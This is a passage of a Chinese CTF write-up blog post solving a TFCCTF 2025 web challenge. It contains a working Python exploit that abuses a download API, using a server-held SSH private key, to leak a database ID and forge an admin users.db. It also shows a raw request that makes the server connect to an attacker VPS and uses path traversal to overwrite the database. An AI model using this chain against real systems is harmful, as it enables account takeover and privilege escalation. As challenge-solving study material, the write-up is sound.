class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">基于目标 Next.js 服务的 /api/download 接口，提取数据库的 DB_ID，</span></span><br><span class="line"><span class="string">并在本地生成一个包含管理员用户的 users.db（密码为可控明文，存储为 bcrypt 哈希）。</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">使用说明（示例）：</span></span><br><span class="line"><span class="string">  python3 exp.py \</span></span><br><span class="line"><span class="string">    --base-url http://localhost:3000 \</span></span><br><span class="line"><span class="string">    --username admin \</span></span><br><span class="line"><span class="string">    --password Admin@123 \</span></span><br><span class="line"><span class="string">    --output ./users.db</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">注意：</span></span><br><span class="line"><span class="string">- 本脚本不会尝试覆盖目标容器内的数据库，只负责在本地生成可用的 users.db。</span></span><br><span class="line"><span class="string">- 后续可结合 SFTP 覆盖漏洞将该文件写回容器（例如利用 filename=&quot;../../users.db&quot;）。</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> __future__ <span class="keyword">import</span> annotations</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> sqlite3</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> urllib.request</span><br><span class="line"><span class="keyword">import</span> urllib.error</span><br><span class="line"><span class="keyword">from</span> typing <span class="keyword">import</span> <span class="type">Optional</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 在 Unix 系统上可用的标准库 bcrypt 实现接口（依赖底层 libxcrypt 对 $2b$ 支持）</span></span><br><span class="line"><span class="comment"># 优先使用 python-bcrypt（若用户已安装），否则回退到 crypt</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">bcrypt_hash</span>(<span class="params">password: <span class="built_in">str</span></span>) -&gt; <span class="built_in">str</span>:</span><br><span class="line">    <span class="string">&quot;&quot;&quot;生成 bcrypt 哈希，优先使用 bcrypt 库，不存在则回退到 crypt（$2b$）。</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    参数:</span></span><br><span class="line"><span class="string">        password: 明文口令</span></span><br><span class="line"><span class="string">    返回:</span></span><br><span class="line"><span class="string">        形如 $2b$10$... 的 bcrypt 哈希字符串</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="comment"># 优先尝试第三方 bcrypt（如已安装）</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">import</span> bcrypt  <span class="comment"># type: ignore</span></span><br><span class="line"></span><br><span class="line">        hashed_bytes = bcrypt.hashpw(</span><br><span class="line">            password.encode(<span class="string">&quot;utf-8&quot;</span>), bcrypt.gensalt(rounds=<span class="number">10</span>)</span><br><span class="line">        )</span><br><span class="line">        <span class="keyword">return</span> hashed_bytes.decode(<span class="string">&quot;utf-8&quot;</span>)</span><br><span class="line">    <span class="keyword">except</span> Exception:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 回退到 crypt（需系统支持 $2b$）</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">import</span> crypt</span><br><span class="line">        <span class="keyword">import</span> secrets</span><br><span class="line">        <span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line">        alphabet = <span class="string">&quot;./&quot;</span> + string.digits + string.ascii_uppercase + string.ascii_lowercase</span><br><span class="line">        salt22 = <span class="string">&quot;&quot;</span>.join(secrets.choice(alphabet) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">22</span>))</span><br><span class="line">        salt = <span class="string">f&quot;$2b$10$<span class="subst">&#123;salt22&#125;</span>&quot;</span></span><br><span class="line">        hashed = crypt.crypt(password, salt)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> hashed <span class="keyword">or</span> <span class="keyword">not</span> hashed.startswith(<span class="string">&quot;$2&quot;</span>):</span><br><span class="line">            <span class="keyword">raise</span> RuntimeError(<span class="string">&quot;系统 crypt 不支持 bcrypt 算法 ($2b$)&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> hashed</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> exc:</span><br><span class="line">        <span class="keyword">raise</span> RuntimeError(</span><br><span class="line">            <span class="string">&quot;无法生成 bcrypt 哈希：请安装 `pip install bcrypt` 或确保系统 crypt 支持 $2b$&quot;</span></span><br><span class="line">        ) <span class="keyword">from</span> exc</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">http_post_json</span>(<span class="params">url: <span class="built_in">str</span>, payload: <span class="built_in">dict</span>, timeout: <span class="built_in">float</span> = <span class="number">15.0</span></span>) -&gt; <span class="built_in">dict</span>:</span><br><span class="line">    <span class="string">&quot;&quot;&quot;使用标准库发起 JSON POST 请求，返回解析后的 JSON 字典。</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    仅依赖 urllib，避免引入额外依赖。</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    data = json.dumps(payload).encode(<span class="string">&quot;utf-8&quot;</span>)</span><br><span class="line">    req = urllib.request.Request(</span><br><span class="line">        url=url,</span><br><span class="line">        data=data,</span><br><span class="line">        headers=&#123;<span class="string">&quot;Content-Type&quot;</span>: <span class="string">&quot;application/json&quot;</span>&#125;,</span><br><span class="line">        method=<span class="string">&quot;POST&quot;</span>,</span><br><span class="line">    )</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">with</span> urllib.request.urlopen(req, timeout=timeout) <span class="keyword">as</span> resp:</span><br><span class="line">            text = resp.read().decode(<span class="string">&quot;utf-8&quot;</span>, errors=<span class="string">&quot;replace&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span> json.loads(text)</span><br><span class="line">    <span class="keyword">except</span> urllib.error.HTTPError <span class="keyword">as</span> e:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            body = e.read().decode(<span class="string">&quot;utf-8&quot;</span>, errors=<span class="string">&quot;replace&quot;</span>)</span><br><span class="line">        <span class="keyword">except</span> Exception:</span><br><span class="line">            body = <span class="string">&quot;&quot;</span></span><br><span class="line">        <span class="keyword">raise</span> RuntimeError(<span class="string">f&quot;HTTP <span class="subst">&#123;e.code&#125;</span> <span class="subst">&#123;e.reason&#125;</span>: <span class="subst">&#123;body&#125;</span>&quot;</span>) <span class="keyword">from</span> e</span><br><span class="line">    <span class="keyword">except</span> urllib.error.URLError <span class="keyword">as</span> e:</span><br><span class="line">        <span class="keyword">raise</span> RuntimeError(<span class="string">f&quot;网络错误: <span class="subst">&#123;e&#125;</span>&quot;</span>) <span class="keyword">from</span> e</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">extract_db_id_from_text</span>(<span class="params">text: <span class="built_in">str</span></span>) -&gt; <span class="type">Optional</span>[<span class="built_in">str</span>]:</span><br><span class="line">    <span class="string">&quot;&quot;&quot;从 /api/download 返回的文本内容中提取 32 位十六进制 DB_ID。</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    由于服务端以 utf-8 读取二进制 SQLite 文件，内容可能被破坏，但 &#x27;db_id&#x27; 与其值通常</span></span><br><span class="line"><span class="string">    仍以明文出现。这里优先匹配 &#x27;db_id&#x27; 附近的 32 位 hex；若失败，回退为全局第一个 32 位 hex。</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="comment"># 优先：锚定 &#x27;db_id&#x27; 关键字附近 0..128 字符内的 32 位十六进制</span></span><br><span class="line">    m = re.search(<span class="string">r&quot;db_id[\s\S]&#123;0,128&#125;?([a-f0-9]&#123;32&#125;)&quot;</span>, text)</span><br><span class="line">    <span class="keyword">if</span> m:</span><br><span class="line">        <span class="keyword">return</span> m.group(<span class="number">1</span>)</span><br><span class="line">    <span class="comment"># 回退：任意出现的 32 位十六进制</span></span><br><span class="line">    m = re.search(<span class="string">r&quot;([a-f0-9]&#123;32&#125;)&quot;</span>, text)</span><br><span class="line">    <span class="keyword">if</span> m:</span><br><span class="line">        <span class="keyword">return</span> m.group(<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">fetch_db_id</span>(<span class="params">base_url: <span class="built_in">str</span></span>) -&gt; <span class="built_in">str</span>:</span><br><span class="line">    <span class="string">&quot;&quot;&quot;调用 /api/download 下载 users.db，并从响应内容中提取 DB_ID。&quot;&quot;&quot;</span></span><br><span class="line">    url = base_url.rstrip(<span class="string">&quot;/&quot;</span>) + <span class="string">&quot;/api/download&quot;</span></span><br><span class="line">    payload = &#123;</span><br><span class="line">        <span class="string">&quot;host&quot;</span>: <span class="string">&quot;localhost&quot;</span>,         <span class="comment"># 在容器内连向本机 sshd</span></span><br><span class="line">        <span class="string">&quot;filename&quot;</span>: <span class="string">&quot;users.db&quot;</span>,      <span class="comment"># 远端路径将解析为 /app/users.db</span></span><br><span class="line">        <span class="string">&quot;keyPath&quot;</span>: <span class="string">&quot;/root/.ssh/id_rsa&quot;</span>,  <span class="comment"># 容器内预置的私钥</span></span><br><span class="line">        <span class="string">&quot;downloadPath&quot;</span>: <span class="string">&quot;/app/downloads/&quot;</span>,</span><br><span class="line">    &#125;</span><br><span class="line">    resp = http_post_json(url, payload)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> <span class="built_in">isinstance</span>(resp, <span class="built_in">dict</span>) <span class="keyword">or</span> <span class="keyword">not</span> resp.get(<span class="string">&quot;ok&quot;</span>):</span><br><span class="line">        <span class="keyword">raise</span> RuntimeError(<span class="string">f&quot;下载 users.db 失败: <span class="subst">&#123;resp&#125;</span>&quot;</span>)</span><br><span class="line">    content = resp.get(<span class="string">&quot;content&quot;</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> <span class="built_in">isinstance</span>(content, <span class="built_in">str</span>) <span class="keyword">or</span> <span class="keyword">not</span> content:</span><br><span class="line">        <span class="keyword">raise</span> RuntimeError(<span class="string">&quot;下载结果无内容或类型异常&quot;</span>)</span><br><span class="line"></span><br><span class="line">    db_id = extract_db_id_from_text(content)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> db_id:</span><br><span class="line">        <span class="keyword">raise</span> RuntimeError(<span class="string">&quot;未能从返回内容中解析出 DB_ID&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> db_id</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">forge_users_db</span>(<span class="params"></span></span><br><span class="line"><span class="params">    output_path: <span class="built_in">str</span>, db_id: <span class="built_in">str</span>, admin_username: <span class="built_in">str</span>, admin_password_hash: <span class="built_in">str</span></span></span><br><span class="line"><span class="params"></span>) -&gt; <span class="literal">None</span>:</span><br><span class="line">    <span class="string">&quot;&quot;&quot;生成符合目标服务结构的 users.db 并写入管理员。&quot;&quot;&quot;</span></span><br><span class="line">    <span class="comment"># 确保输出目录存在</span></span><br><span class="line">    out_dir = os.path.dirname(os.path.abspath(output_path)) <span class="keyword">or</span> <span class="string">&quot;.&quot;</span></span><br><span class="line">    os.makedirs(out_dir, exist_ok=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 若已存在，先删除避免旧结构干扰</span></span><br><span class="line">    <span class="keyword">if</span> os.path.exists(output_path):</span><br><span class="line">        os.remove(output_path)</span><br><span class="line"></span><br><span class="line">    conn = sqlite3.connect(output_path)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        cur = conn.cursor()</span><br><span class="line">        <span class="comment"># 建表结构与服务端一致</span></span><br><span class="line">        cur.executescript(</span><br><span class="line">            <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">            PRAGMA journal_mode=WAL;</span></span><br><span class="line"><span class="string">            CREATE TABLE IF NOT EXISTS users (</span></span><br><span class="line"><span class="string">              id INTEGER PRIMARY KEY AUTOINCREMENT,</span></span><br><span class="line"><span class="string">              username TEXT UNIQUE NOT NULL,</span></span><br><span class="line"><span class="string">              password TEXT NOT NULL,</span></span><br><span class="line"><span class="string">              admin BOOLEAN DEFAULT 0</span></span><br><span class="line"><span class="string">            );</span></span><br><span class="line"><span class="string">            CREATE TABLE IF NOT EXISTS meta (</span></span><br><span class="line"><span class="string">              key TEXT PRIMARY KEY,</span></span><br><span class="line"><span class="string">              value TEXT NOT NULL</span></span><br><span class="line"><span class="string">            );</span></span><br><span class="line"><span class="string">            &quot;&quot;&quot;</span></span><br><span class="line">        )</span><br><span class="line">        <span class="comment"># 设置 DB 签名</span></span><br><span class="line">        cur.execute(</span><br><span class="line">            <span class="string">&quot;INSERT INTO meta(key, value) VALUES(?, ?) &quot;</span></span><br><span class="line">            <span class="string">&quot;ON CONFLICT(key) DO UPDATE SET value=excluded.value&quot;</span>,</span><br><span class="line">            (<span class="string">&quot;db_id&quot;</span>, db_id),</span><br><span class="line">        )</span><br><span class="line">        <span class="comment"># 写入管理员用户</span></span><br><span class="line">        cur.execute(</span><br><span class="line">            <span class="string">&quot;INSERT INTO users(username, password, admin) VALUES(?, ?, ?)&quot;</span>,</span><br><span class="line">            (admin_username, admin_password_hash, <span class="number">1</span>),</span><br><span class="line">        )</span><br><span class="line">        conn.commit()</span><br><span class="line">    <span class="keyword">finally</span>:</span><br><span class="line">        conn.close()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>() -&gt; <span class="built_in">int</span>:</span><br><span class="line">    parser = argparse.ArgumentParser(</span><br><span class="line">        description=<span class="string">&quot;从目标服务提取 DB_ID，并本地生成包含管理员用户的 users.db&quot;</span></span><br><span class="line">    )</span><br><span class="line">    parser.add_argument(</span><br><span class="line">        <span class="string">&quot;--base-url&quot;</span>,</span><br><span class="line">        default=<span class="string">&quot;http://localhost:3000&quot;</span>,</span><br><span class="line">        <span class="built_in">help</span>=<span class="string">&quot;目标服务根地址，如 http://localhost:3000&quot;</span>,</span><br><span class="line">    )</span><br><span class="line">    parser.add_argument(</span><br><span class="line">        <span class="string">&quot;--username&quot;</span>, default=<span class="string">&quot;admin&quot;</span>, <span class="built_in">help</span>=<span class="string">&quot;要写入的管理员用户名&quot;</span></span><br><span class="line">    )</span><br><span class="line">    parser.add_argument(</span><br><span class="line">        <span class="string">&quot;--password&quot;</span>,</span><br><span class="line">        default=<span class="string">&quot;Admin@123&quot;</span>,</span><br><span class="line">        <span class="built_in">help</span>=<span class="string">&quot;管理员明文密码（将计算为 bcrypt 哈希存入 DB）&quot;</span>,</span><br><span class="line">    )</span><br><span class="line">    parser.add_argument(</span><br><span class="line">        <span class="string">&quot;--output&quot;</span>, default=<span class="string">&quot;./users.db&quot;</span>, <span class="built_in">help</span>=<span class="string">&quot;输出的 SQLite 文件路径&quot;</span></span><br><span class="line">    )</span><br><span class="line">    parser.add_argument(</span><br><span class="line">        <span class="string">&quot;--password-hash&quot;</span>,</span><br><span class="line">        default=<span class="literal">None</span>,</span><br><span class="line">        <span class="built_in">help</span>=<span class="string">&quot;可选：直接提供已计算好的 bcrypt 哈希，若提供将跳过本地计算&quot;</span>,</span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line">    args = parser.parse_args()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;[*] 目标: <span class="subst">&#123;args.base_url&#125;</span>&quot;</span>)</span><br><span class="line">        db_id = fetch_db_id(args.base_url)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;[+] 提取到 DB_ID: <span class="subst">&#123;db_id&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> args.password_hash:</span><br><span class="line">            admin_hash = args.password_hash</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;[*] 使用外部提供的 bcrypt 哈希&quot;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;[*] 正在生成管理员口令的 bcrypt 哈希（成本因子 10）...&quot;</span>)</span><br><span class="line">            admin_hash = bcrypt_hash(args.password)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;[+] bcrypt 哈希: <span class="subst">&#123;admin_hash&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">        forge_users_db(args.output, db_id, args.username, admin_hash)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;[+] 已生成本地数据库: <span class="subst">&#123;os.path.abspath(args.output)&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[!] 后续可通过 SFTP 覆盖漏洞将该文件写回容器以生效。&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;[!] 失败: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    sys.exit(main())</span><br></pre></td></tr></table></figure>

<p>之后打开靶机注册账户 qqq &#x2F; qqq</p>
<p>获取并生成users.db</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python .\message.py --base-url https://crooneytfc-655e0fb5087f0b1f.challs.tfcctf.com/ --username qqq --password qqq --output users.db</span><br></pre></td></tr></table></figure>

<p>将生成的users.db放在vps的&#x2F;app&#x2F;app目录</p>
<p>在服务器上运行fake_server.py,注意检查22端口是否冲突</p>
<p>靶机登录qqq账户, 发包</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">POST /api/download HTTP/2</span><br><span class="line">Host: crooneytfc-655e0fb5087f0b1f.challs.tfcctf.com</span><br><span class="line">Cookie: token=MTpxcXE%3D</span><br><span class="line">Content-Length: 113</span><br><span class="line">Sec-Ch-Ua-Platform: &quot;Windows&quot;</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36</span><br><span class="line">Sec-Ch-Ua: &quot;Not;A=Brand&quot;;v=&quot;99&quot;, &quot;Google Chrome&quot;;v=&quot;139&quot;, &quot;Chromium&quot;;v=&quot;139&quot;</span><br><span class="line">Content-Type: application/json</span><br><span class="line">Sec-Ch-Ua-Mobile: ?0</span><br><span class="line">Accept: */*</span><br><span class="line">Origin: https://crooneytfc-655e0fb5087f0b1f.challs.tfcctf.com</span><br><span class="line">Sec-Fetch-Site: same-origin</span><br><span class="line">Sec-Fetch-Mode: cors</span><br><span class="line">Sec-Fetch-Dest: empty</span><br><span class="line">Referer: https://crooneytfc-655e0fb5087f0b1f.challs.tfcctf.com/</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9,en;q=0.8</span><br><span class="line">Priority: u=1, i</span><br><span class="line"></span><br><span class="line">&#123;&quot;host&quot;:&quot;vps_ip&quot;,&quot;filename&quot;:&quot;../users.db&quot;,&quot;keyPath&quot;:&quot;/root/.ssh/id_rsa&quot;,&quot;downloadPath&quot;:&quot;/app/downloads/&quot;&#125;</span><br></pre></td></tr></table></figure>

<p>服务器收到请求<br><img src="/2025/08/29/TFCCTF-2025/3.png" alt="alt text"></p>
<p>此时qqq账户已经是admin权限</p>
<p>访问 <code>/api/admin</code> 即得flag</p>
</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="https://sakuraraindrop.github.io">cheng_xing</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="https://sakuraraindrop.github.io/2025/08/29/TFCCTF-2025/">https://sakuraraindrop.github.io/2025/08/29/TFCCTF-2025/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来源 <a href="https://sakuraraindrop.github.io" target="_blank">cheng_xing's blog</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/pyjail/">pyjail</a><a class="post-meta__tags" href="/tags/xss/">xss</a><a class="post-meta__tags" href="/tags/%E8%BD%AF%E9%93%BE%E6%8E%A5/">软链接</a><a class="post-meta__tags" href="/tags/Mako-SSTI/">Mako SSTI</a><a class="post-meta__tags" href="/tags/bashFuck/">bashFuck</a></div><div class="post-share"><div class="social-share" data-image="/img/ltx.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related  no-desc" href="/2025/08/24/HITCON-2025/" title="HITCON-2025"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info"><div class="info-1"><div class="info-item-1">上一篇</div><div class="info-item-2">HITCON-2025</div></div></div></a><a class="pagination-related  no-desc" href="/2025/09/02/XSS-1-%E4%BB%8EXSS%E5%BC%80%E5%A7%8B/" title="XSS-1-从XSS开始"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-right"><div class="info-1"><div class="info-item-1">下一篇</div><div class="info-item-2">XSS-1-从XSS开始</div></div></div></a></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><a class="pagination-related no-desc" href="/2025/07/11/20250711%E9%9A%8F%E7%BC%98%E5%88%B7%E9%A2%98/" title="20250711随缘刷题"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-07-11</div><div class="info-item-2">20250711随缘刷题</div></div></div></a><a class="pagination-related no-desc" href="/2025/07/08/20250708%E9%9A%8F%E7%BC%98%E5%88%B7%E9%A2%98/" title="20250708随缘刷题"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-07-08</div><div class="info-item-2">20250708随缘刷题</div></div></div></a><a class="pagination-related no-desc" href="/2025/07/13/20250713%E9%9A%8F%E7%BC%98%E5%88%B7%E9%A2%98/" title="20250713随缘刷题"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-07-13</div><div class="info-item-2">20250713随缘刷题</div></div></div></a><a class="pagination-related no-desc" href="/2025/08/24/HITCON-2025/" title="HITCON-2025"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-08-24</div><div class="info-item-2">HITCON-2025</div></div></div></a><a class="pagination-related no-desc" href="/2025/04/04/XYCTF2025/" title="XYCTF2025"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-04-04</div><div class="info-item-2">XYCTF2025</div></div></div></a><a class="pagination-related no-desc" href="/2025/04/07/pyjail%20problems/" title="pyjail problems"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-04-07</div><div class="info-item-2">pyjail problems</div></div></div></a></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="/img/ltx.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info-name">cheng_xing</div><div class="author-info-description">web菜鸡修炼中</div><div class="site-data"><a href="/archives/"><div class="headline">文章</div><div class="length-num">61</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">147</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">11</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/sakuraraindrop"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons"><a class="social-icon" href="https://github.com/sakuraraindrop" target="_blank" title="Github"><i class="fab fa-github" style="color: #hdhfbb;"></i></a><a class="social-icon" href="https://space.bilibili.com/504596197" target="_blank" title="Bilibili"><i class="fab fa-bilibili" style="color: #000000;"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">This is my Blog</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#DISCORD-SHENANIGANS-V5"><span class="toc-number">1.</span> <span class="toc-text">DISCORD SHENANIGANS V5</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#FONT-LEAGUES"><span class="toc-number">2.</span> <span class="toc-text">FONT LEAGUES</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%86%E6%9E%90%E8%87%AA%E5%AE%9A%E4%B9%89%E5%AD%97%E4%BD%93"><span class="toc-number">2.1.</span> <span class="toc-text">分析自定义字体</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%A1%AE%E8%AE%A4%E6%9C%80%E7%BB%88%E7%9B%AE%E6%A0%87%E5%AD%97%E5%BD%A2"><span class="toc-number">2.2.</span> <span class="toc-text">确认最终目标字形</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%8D%E5%90%91%E5%B1%95%E5%BC%80%E5%BE%97%E5%88%B0%E8%BE%93%E5%85%A5%E5%BA%8F%E5%88%97"><span class="toc-number">2.3.</span> <span class="toc-text">反向展开得到输入序列</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SLIPPY"><span class="toc-number">3.</span> <span class="toc-text">SLIPPY</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#KISSFIXESS"><span class="toc-number">4.</span> <span class="toc-text">KISSFIXESS</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#KISSFIXESS-REVENGE"><span class="toc-number">5.</span> <span class="toc-text">KISSFIXESS REVENGE</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#WEBLESS"><span class="toc-number">6.</span> <span class="toc-text">WEBLESS</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90"><span class="toc-number">6.1.</span> <span class="toc-text">源码分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%94%BB%E5%87%BB%E6%80%9D%E8%B7%AF"><span class="toc-number">6.2.</span> <span class="toc-text">攻击思路</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#payload"><span class="toc-number">6.3.</span> <span class="toc-text">payload</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" 